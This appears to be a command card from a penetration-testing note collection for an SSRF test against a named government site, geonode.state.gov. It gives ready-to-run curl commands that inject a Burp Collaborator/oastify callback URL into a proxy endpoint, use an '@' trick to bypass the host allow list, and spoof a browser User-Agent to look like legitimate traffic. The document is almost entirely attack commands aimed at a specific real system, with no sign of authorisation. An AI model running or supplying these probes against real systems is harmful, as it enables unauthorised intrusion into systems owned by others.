---
data: >-
  curl -X GET
  "https://geonode.state.gov/proxy/?url=http://burpcollablink@geonode.state.gov"
  -H "Host: geonode.state.gov" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0
  Safari/537.36"
tags:
  - ssrf
  - test
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.008Z'
id: 850eba1d-05a9-43ee-a73d-df3dfddfb9d0
verified: false
validated: true
submitted: true
---
# test-ssrf-with-collaborator

## Command

```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://burpcollablink@geonode.state.gov" -H "Host: geonode.state.gov" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
```

## Description

Tests for SSRF by sending a request to the proxy endpoint with a Burp Collaborator URL appended to the whitelisted host, detecting out-of-band server requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Collaborator URL + @whitelisted host | Yes |
| Host | Target host header | Yes |
| User-Agent | Browser-like UA to mimic legitimate traffic | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://yourcollab.oastify.com@geonode.state.gov" -H "Host: geonode.state.gov"
```

### Advanced Usage

```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://yourcollab.oastify.com@geonode.state.gov" -H "Host: geonode.state.gov" -H "Cookie: session=abc123" -H "Accept: */*"
```

## Expected Output

No direct response indicates success; check Burp Collaborator for incoming DNS/HTTP requests from the server.

## Related

- [[commands/bypass-whitelist-to-internal-ip]]
- [[procedures/Identify-and-Test-SSRF-Endpoint]]
